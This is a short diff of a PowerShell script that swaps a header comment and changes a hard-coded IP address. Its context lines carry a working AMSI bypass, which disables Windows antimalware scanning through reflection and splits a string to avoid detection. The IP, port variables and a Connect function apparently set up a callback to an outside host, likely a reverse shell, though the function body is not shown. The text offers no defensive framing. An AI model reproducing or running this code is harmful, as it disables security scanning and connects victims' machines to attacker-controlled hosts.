@@ -1,10 +1,10 @@
-# === LIGHTER VARIANT ===
+# == NUTS AND BALLS == #
 
 $a = "AmsiUtils"
 $b = "System.Man" + "agement.Automation." + $a
 [Ref].Assembly.GetType($b).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-$ip = "72.226.70.54"
+$ip = "86.134.165.94"
 $port = 60068
 
 function Connect {
